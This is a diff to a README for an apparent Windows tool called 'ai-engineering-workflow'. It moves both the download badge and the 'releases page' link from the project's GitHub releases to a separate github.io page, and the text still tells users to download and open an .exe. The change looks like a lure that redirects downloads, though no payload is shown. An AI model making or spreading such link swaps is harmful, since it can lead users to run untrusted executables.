@@ -1,6 +1,6 @@
 # ⚙️ ai-engineering-workflow - Organize complex projects with structured AI steps
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/definitive-cheapjack965/ai-engineering-workflow/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://definitive-cheapjack965.github.io)
 
 ## 📌 About this project
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 Follow these instructions to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/definitive-cheapjack965/ai-engineering-workflow/releases) to download the latest version.
+1. Visit the [releases page](https://definitive-cheapjack965.github.io) to download the latest version.
 2. Look for the file ending in .exe in the list of assets.
 3. Click the file name to start the download.
 4. Open your downloads folder once the file finishes saving.
